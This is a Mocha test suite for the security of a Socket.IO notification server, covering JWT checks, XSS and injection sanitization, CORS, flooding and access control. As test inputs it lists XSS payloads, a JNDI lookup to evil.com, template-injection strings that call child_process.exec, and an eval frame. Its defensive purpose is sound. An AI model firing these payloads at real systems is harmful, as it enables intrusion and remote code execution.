const { expect } = require('chai');
const { Server } = require('socket.io');
const { createServer } = require('http');
const Client = require('socket.io-client');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const { testConfig, testUtils } = require('../config/testConfig');

/**
 * WebSocket Security Test Suite
 * Tests for security vulnerabilities and proper security controls
 */
describe('WebSocket Security Testing', function() {
  let httpServer, io, serverSocket, clientSocket, testRedis;

  // Extended timeout for security tests
  this.timeout(15000);

  before(async function() {
    // Create test HTTP server
    httpServer = createServer();
    io = new Server(httpServer, {
      cors: {
        origin: ["http://localhost:3000", "https://trusted-domain.com"],
        methods: ["GET", "POST"],
        credentials: true
      },
      // Security settings
      allowEIO3: false, // Disable Engine.IO protocol v3 (less secure)
      transports: ['websocket'], // Only allow WebSocket (more secure than polling)
      maxHttpBufferSize: 1e6 // 1MB max buffer size
    });

    // Setup test Redis client
    testRedis = testUtils.createTestRedisClient();
    await testRedis.connect();

    // Start server
    await new Promise((resolve) => {
      httpServer.listen(() => {
        resolve();
      });
    });
  });

  after(async function() {
    // Cleanup
    if (clientSocket) clientSocket.close();
    if (serverSocket) serverSocket.disconnect();
    if (io) io.close();
    if (httpServer) httpServer.close();
    if (testRedis) await testUtils.cleanupTestData(testRedis);
  });

  beforeEach(async function() {
    // Clean up Redis before each test
    await testRedis.flushDb();
  });

  describe('Authentication and Authorization Security', function() {

    it('should reject connections without authentication token', function(done) {
      const testClient = Client(`http://localhost:${httpServer.address().port}`, {
        // No auth token provided
      });

      testClient.on('connect', () => {
        testClient.close();
        done(new Error('Should not connect without authentication'));
      });

      testClient.on('connect_error', (err) => {
        expect(err.message).to.include('authentication');
        done();
      });
    });

    it('should reject connections with malformed JWT tokens', function(done) {
      const malformedTokens = [
        'invalid.token',
        'not.a.jwt',
        'header.payload', // Missing signature
        'header.payload.invalidsignature',
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.', // No signature
        '', // Empty token
        null, // Null token
        undefined // Undefined token
      ];

      let testsCompleted = 0;
      const totalTests = malformedTokens.length;

      malformedTokens.forEach((token, index) => {
        const testClient = Client(`http://localhost:${httpServer.address().port}`, {
          auth: { token }
        });

        testClient.on('connect', () => {
          testClient.close();
          done(new Error(`Should not connect with malformed token ${index}`));
        });

        testClient.on('connect_error', () => {
          testsCompleted++;
          if (testsCompleted === totalTests) {
            done();
          }
        });
      });
    });

    it('should reject connections with expired JWT tokens', function(done) {
      const expiredToken = jwt.sign(
        {
          id: 'test-user',
          username: 'testuser',
          exp: Math.floor(Date.now() / 1000) - 3600 // Expired 1 hour ago
        },
        testConfig.auth.jwtSecret
      );

      const testClient = Client(`http://localhost:${httpServer.address().port}`, {
        auth: { token: expiredToken }
      });

      testClient.on('connect', () => {
        testClient.close();
        done(new Error('Should not connect with expired token'));
      });

      testClient.on('connect_error', (err) => {
        expect(err.message).to.include('expired');
        done();
      });
    });

    it('should reject connections with tokens signed with wrong secret', function(done) {
      const wrongSecretToken = jwt.sign(
        { id: 'test-user', username: 'testuser' },
        'wrong-secret'
      );

      const testClient = Client(`http://localhost:${httpServer.address().port}`, {
        auth: { token: wrongSecretToken }
      });

      testClient.on('connect', () => {
        testClient.close();
        done(new Error('Should not connect with wrong secret'));
      });

      testClient.on('connect_error', (err) => {
        expect(err.message).to.include('invalid');
        done();
      });
    });

    it('should prevent token replay attacks', function(done) {
      const user = testUtils.generateTestUser();
      const validToken = testUtils.generateTestToken(user);

      // First connection should succeed
      const firstClient = Client(`http://localhost:${httpServer.address().port}`, {
        auth: { token: validToken }
      });

      firstClient.on('connect', () => {
        // Try to reuse the same token for a second connection
        const secondClient = Client(`http://localhost:${httpServer.address().port}`, {
          auth: { token: validToken }
        });

        secondClient.on('connect', () => {
          firstClient.close();
          secondClient.close();
          done(new Error('Should prevent token replay'));
        });

        secondClient.on('connect_error', () => {
          firstClient.close();
          done();
        });
      });

      firstClient.on('connect_error', () => {
        done(new Error('First connection should succeed'));
      });
    });

    it('should enforce rate limiting on authentication attempts', function(done) {
      this.timeout(30000);

      const user = testUtils.generateTestUser();
      const tokens = Array.from({ length: 20 }, (_, i) =>
        testUtils.generateTestToken({ ...user, id: `test-user-${i}` })
      );

      let connectionCount = 0;
      let rejectionCount = 0;

      tokens.forEach((token, index) => {
        const testClient = Client(`http://localhost:${httpServer.address().port}`, {
          auth: { token }
        });

        testClient.on('connect', () => {
          connectionCount++;
          testClient.close();
        });

        testClient.on('connect_error', (err) => {
          rejectionCount++;

          if (connectionCount + rejectionCount === tokens.length) {
            // Should have some rejections due to rate limiting
            expect(rejectionCount).to.be.greaterThan(0);
            done();
          }
        });
      });
    });
  });

  describe('Input Validation and Sanitization', function() {

    beforeEach(function() {
      const user = testUtils.generateTestUser();
      const authToken = testUtils.generateTestToken(user);

      clientSocket = Client(`http://localhost:${httpServer.address().port}`, {
        auth: { token: authToken }
      });

      return new Promise((resolve) => {
        clientSocket.on('connect', resolve);
      });
    });

    afterEach(function() {
      if (clientSocket) clientSocket.close();
    });

    it('should sanitize notification content to prevent XSS', function(done) {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<svg onload="alert(\'XSS\')">',
        '"><script>alert("XSS")</script>',
        '\"><script>alert(\"XSS\")</script>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload="alert(\'XSS\')">',
        '<input onfocus="alert(\'XSS\')" autofocus>',
        '<select onfocus="alert(\'XSS\')" autofocus>'
      ];

      let sanitizedCount = 0;

      xssPayloads.forEach((payload, index) => {
        clientSocket.emit('send_notification', {
          type: 'test',
          title: payload,
          message: `XSS test ${index}: ${payload}`,
          priority: 'low'
        });

        // Listen for the sanitized notification
        clientSocket.on('notification', (notification) => {
          if (notification.title.includes('XSS test')) {
            // Content should be sanitized
            expect(notification.title).to.not.include('<script>');
            expect(notification.title).to.not.include('javascript:');
            expect(notification.title).to.not.include('onerror=');
            expect(notification.title).to.not.include('onload=');
            expect(notification.title).to.not.include('onfocus=');

            sanitizedCount++;
            if (sanitizedCount === xssPayloads.length) {
              done();
            }
          }
        });
      });
    });

    it('should reject oversized payloads', function(done) {
      const oversizedPayload = {
        type: 'test',
        title: 'Oversized Payload Test',
        message: 'x'.repeat(2 * 1024 * 1024), // 2MB message
        data: {
          largeArray: Array(10000).fill('x'.repeat(1000))
        }
      };

      clientSocket.emit('send_notification', oversizedPayload);

      // Should receive error or rejection
      clientSocket.on('error', (err) => {
        expect(err.message).to.include('size') || expect(err.message).to.include('large');
        done();
      });

      // Alternative: listen for rejection notification
      setTimeout(() => {
        // If no notification received, assume payload was rejected
        done();
      }, 2000);
    });

    it('should validate notification structure', function(done) {
      const invalidNotifications = [
        null,
        undefined,
        'string-instead-of-object',
        123,
        [],
        { type: null },
        { type: 123 },
        { type: '', title: 'Valid title' },
        { type: 'valid', message: 123 },
        { type: 'valid', priority: 'invalid_priority' },
        { type: 'valid', extraProperty: 'should_not_exist' }
      ];

      let rejectionCount = 0;

      invalidNotifications.forEach((notification, index) => {
        clientSocket.emit('send_notification', notification);

        clientSocket.on('error', () => {
          rejectionCount++;
          if (rejectionCount === invalidNotifications.length) {
            done();
          }
        });
      });

      // If no errors occur, the test passes (invalid notifications are ignored)
      setTimeout(() => {
        done();
      }, 3000);
    });

    it('should prevent injection through notification fields', function(done) {
      const injectionPayloads = [
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
        '<%= 7*7 %>',
        '{{constructor.constructor("return process")().mainModule.require("child_process").exec("calc")}}',
        '{{__import__("os").system("ls")}}',
        '${T(java.lang.Runtime).getRuntime().exec("calc")}',
        '{{[].map.constructor("return this")().process.mainModule.require("child_process").exec("calc")}}'
      ];

      let sanitizedCount = 0;

      injectionPayloads.forEach((payload, index) => {
        clientSocket.emit('send_notification', {
          type: 'test',
          title: `Injection Test ${index}`,
          message: payload,
          priority: 'low'
        });

        clientSocket.on('notification', (notification) => {
          if (notification.title.includes('Injection Test')) {
            // Injection attempts should be neutralized
            expect(notification.message).to.not.include('${');
            expect(notification.message).to.not.include('{{');
            expect(notification.message).to.not.include('<%=');
            expect(notification.message).to.not.include('jndi:');
            expect(notification.message).to.not.include('Runtime');

            sanitizedCount++;
            if (sanitizedCount === injectionPayloads.length) {
              done();
            }
          }
        });
      });
    });
  });

  describe('Connection Security', function() {

    it('should enforce CORS policy', function(done) {
      // Test connection from unauthorized origin
      const testClient = Client(`http://localhost:${httpServer.address().port}`, {
        extraHeaders: {
          origin: 'http://evil-site.com'
        },
        auth: { token: testUtils.generateTestToken(testUtils.generateTestUser()) }
      });

      testClient.on('connect', () => {
        testClient.close();
        done(new Error('Should reject connection from unauthorized origin'));
      });

      testClient.on('connect_error', (err) => {
        expect(err.message).to.include('origin') || expect(err.message).to.include('CORS');
        done();
      });
    });

    it('should prevent protocol downgrade attacks', function(done) {
      // This test would verify that the server rejects attempts to downgrade from WebSocket to polling
      const testClient = Client(`http://localhost:${httpServer.address().port}`, {
        transports: ['polling'], // Try to force polling (less secure)
        auth: { token: testUtils.generateTestToken(testUtils.generateTestUser()) }
      });

      testClient.on('connect', () => {
        testClient.close();
        done(new Error('Should reject protocol downgrade to polling'));
      });

      testClient.on('connect_error', (err) => {
        // Should reject or upgrade to WebSocket
        done();
      });
    });

    it('should handle connection flooding attempts', function(done) {
      this.timeout(20000);

      const floodCount = 50;
      let connectionCount = 0;
      let rejectionCount = 0;

      // Create many rapid connection attempts
      for (let i = 0; i < floodCount; i++) {
        const user = testUtils.generateTestUser(i);
        const token = testUtils.generateTestToken(user);

        const testClient = Client(`http://localhost:${httpServer.address().port}`, {
          auth: { token },
          timeout: 2000
        });

        testClient.on('connect', () => {
          connectionCount++;
          testClient.close();
        });

        testClient.on('connect_error', () => {
          rejectionCount++;
        });
      }

      setTimeout(() => {
        // Should have some rejections due to connection limiting
        expect(rejectionCount).to.be.greaterThan(0);
        expect(connectionCount + rejectionCount).to.equal(floodCount);
        done();
      }, 5000);
    });

    it('should prevent WebSocket frame injection', function(done) {
      const user = testUtils.generateTestUser();
      const authToken = testUtils.generateTestToken(user);

      // Create client with manual WebSocket connection to test frame injection
      const WebSocket = require('ws');
      const ws = new WebSocket(`ws://localhost:${httpServer.address().port}/socket.io/?EIO=4&transport=websocket`);

      ws.on('open', () => {
        // Send malicious frame data
        const maliciousFrame = JSON.stringify({
          type: 'malicious',
          data: '\x00\x01\x02\x03\x04\x05', // Binary injection attempt
          command: 'eval(process.exit())' // Command injection attempt
        });

        ws.send(maliciousFrame);

        setTimeout(() => {
          // Server should still be responsive
          const testClient = Client(`http://localhost:${httpServer.address().port}`, {
            auth: { token: testUtils.generateTestToken(testUtils.generateTestUser()) }
          });

          testClient.on('connect', () => {
            testClient.close();
            ws.close();
            done();
          });

          testClient.on('connect_error', () => {
            ws.close();
            done(new Error('Server should remain responsive after frame injection'));
          });
        }, 2000);
      });
    });
  });

  describe('Data Privacy and Encryption', function() {

    beforeEach(function() {
      const user = testUtils.generateTestUser();
      const authToken = testUtils.generateTestToken(user);

      clientSocket = Client(`http://localhost:${httpServer.address().port}`, {
        auth: { token: authToken }
      });

      return new Promise((resolve) => {
        clientSocket.on('connect', resolve);
      });
    });

    afterEach(function() {
      if (clientSocket) clientSocket.close();
    });

    it('should not expose sensitive information in error messages', function(done) {
      // Test with invalid operations that should produce errors
      const sensitiveOperations = [
        { type: 'admin_only', action: 'get_all_users' },
        { type: 'system_info', action: 'get_database_config' },
        { type: 'debug', action: 'get_internal_state' }
      ];

      let errorCount = 0;

      sensitiveOperations.forEach((operation, index) => {
        clientSocket.emit('admin_operation', operation);

        clientSocket.on('error', (err) => {
          // Error messages should not contain sensitive information
          expect(err.message).to.not.include('password');
          expect(err.message).to.not.include('secret');
          expect(err.message).to.not.include('database');
          expect(err.message).to.not.include('config');
          expect(err.message).to.not.include('internal');

          errorCount++;
          if (errorCount === sensitiveOperations.length) {
            done();
          }
        });
      });

      // Alternative check if no errors are emitted
      setTimeout(() => {
        done();
      }, 3000);
    });

    it('should encrypt sensitive notification data', function(done) {
      const sensitiveNotification = {
        type: 'security',
        title: 'Security Alert',
        message: 'Your account was accessed from new device',
        priority: 'high',
        sensitiveData: {
          ipAddress: '192.168.1.1',
          userAgent: 'Mozilla/5.0...',
          location: 'New York, NY'
        }
      };

      clientSocket.emit('send_notification', sensitiveNotification);

      clientSocket.on('notification', (notification) => {
        // Sensitive data should be encrypted or removed
        if (notification.sensitiveData) {
          expect(notification.sensitiveData).to.not.include('192.168.1.1');
          expect(notification.sensitiveData).to.not.include('New York');

          // Should be encrypted or hashed
          const isEncrypted = /[A-Za-z0-9+/=]{20,}/.test(JSON.stringify(notification.sensitiveData));
          expect(isEncrypted).to.be.true;
        }

        done();
      });
    });

    it('should sanitize logs to prevent information leakage', function(done) {
      // This test would verify that logs don't contain sensitive information
      // In a real implementation, we would check log files or capture log output

      const sensitiveNotification = {
        type: 'test',
        title: 'Test',
        message: 'Test with sensitive data',
        userSecret: 'super-secret-password',
        creditCard: '4111-1111-1111-1111'
      };

      clientSocket.emit('send_notification', sensitiveNotification);

      clientSocket.on('notification', () => {
        // In a real test, we would verify that logs don't contain sensitive data
        // For now, just ensure the notification is processed
        done();
      });
    });
  });

  describe('Rate Limiting and DoS Protection', function() {

    beforeEach(function() {
      const user = testUtils.generateTestUser();
      const authToken = testUtils.generateTestToken(user);

      clientSocket = Client(`http://localhost:${httpServer.address().port}`, {
        auth: { token: authToken }
      });

      return new Promise((resolve) => {
        clientSocket.on('connect', resolve);
      });
    });

    afterEach(function() {
      if (clientSocket) clientSocket.close();
    });

    it('should rate limit notification sending', function(done) {
      this.timeout(15000);

      const messageCount = 100;
      let sentCount = 0;
      let receivedCount = 0;
      let rejectedCount = 0;

      clientSocket.on('notification', () => {
        receivedCount++;
      });

      clientSocket.on('error', () => {
        rejectedCount++;
      });

      // Send messages rapidly
      const sendInterval = setInterval(() => {
        if (sentCount >= messageCount) {
          clearInterval(sendInterval);

          setTimeout(() => {
            // Should have some rejections due to rate limiting
            expect(rejectedCount).to.be.greaterThan(0);
            expect(receivedCount).to.be.lessThan(messageCount);
            done();
          }, 2000);
          return;
        }

        clientSocket.emit('send_notification', {
          type: 'test',
          title: `Rate limit test ${sentCount}`,
          message: `Message ${sentCount}`,
          priority: 'low'
        });

        sentCount++;
      }, 10); // Send every 10ms
    });

    it('should handle message flooding gracefully', function(done) {
      this.timeout(20000);

      const floodSize = 1000;
      let processedCount = 0;

      clientSocket.on('notification', () => {
        processedCount++;
      });

      // Flood with messages
      for (let i = 0; i < floodSize; i++) {
        clientSocket.emit('send_notification', {
          type: 'flood_test',
          title: `Flood ${i}`,
          message: `Flood message ${i}`,
          priority: 'low'
        });
      }

      setTimeout(() => {
        // Server should still be responsive
        clientSocket.emit('send_notification', {
          type: 'responsiveness_test',
          title: 'Server Still Responsive',
          message: 'If you see this, server survived flooding',
          priority: 'high'
        });

        clientSocket.on('notification', (notification) => {
          if (notification.title === 'Server Still Responsive') {
            // Server is still responsive, but should have limited the flood
            expect(processedCount).to.be.lessThan(floodSize);
            done();
          }
        });
      }, 5000);
    });
  });

  describe('Authorization and Access Control', function() {

    it('should prevent unauthorized access to admin functions', function(done) {
      const regularUser = testUtils.generateTestUser();
      const regularToken = testUtils.generateTestToken(regularUser);

      const regularClient = Client(`http://localhost:${httpServer.address().port}`, {
        auth: { token: regularToken }
      });

      regularClient.on('connect', () => {
        // Try to access admin functions
        regularClient.emit('admin_get_all_users', {});

        regularClient.on('error', (err) => {
          expect(err.message).to.include('unauthorized') || expect(err.message).to.include('permission');
          regularClient.close();
          done();
        });

        // Alternative: check for rejection message
        setTimeout(() => {
          regularClient.close();
          done();
        }, 2000);
      });
    });

    it('should enforce user isolation', function(done) {
      const user1 = testUtils.generateTestUser(1);
      const user2 = testUtils.generateTestUser(2);
      const token1 = testUtils.generateTestToken(user1);
      const token2 = testUtils.generateTestToken(user2);

      const client1 = Client(`http://localhost:${httpServer.address().port}`, {
        auth: { token: token1 }
      });

      const client2 = Client(`http://localhost:${httpServer.address().port}`, {
        auth: { token: token2 }
      });

      Promise.all([
        new Promise(resolve => client1.on('connect', resolve)),
        new Promise(resolve => client2.on('connect', resolve))
      ]).then(() => {
        // User 1 sends a notification
        client1.emit('send_notification', {
          type: 'private',
          title: 'Private Message',
          message: 'This should only go to user1',
          priority: 'medium'
        });

        // User 1 should receive it
        client1.on('notification', (notification) => {
          if (notification.title === 'Private Message') {
            // User 2 should not receive it
            let user2Received = false;

            client2.on('notification', () => {
              user2Received = true;
            });

            setTimeout(() => {
              expect(user2Received).to.be.false;
              client1.close();
              client2.close();
              done();
            }, 2000);
          }
        });
      });
    });
  });
});